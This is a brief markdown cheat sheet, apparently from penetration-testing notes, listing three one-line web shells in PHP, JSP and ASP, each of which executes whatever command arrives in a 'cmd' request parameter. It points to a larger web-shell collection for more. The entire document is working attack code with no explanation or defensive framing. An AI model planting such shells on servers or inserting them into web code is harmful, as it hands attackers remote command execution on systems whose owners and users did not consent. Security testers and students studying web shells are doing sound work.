# Simplest webshells

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

> More [here](https://github.com/jbarcia/Web-Shells/tree/master/laudanum), or in your `/usr/share/laudanum` if you installed kali/parrot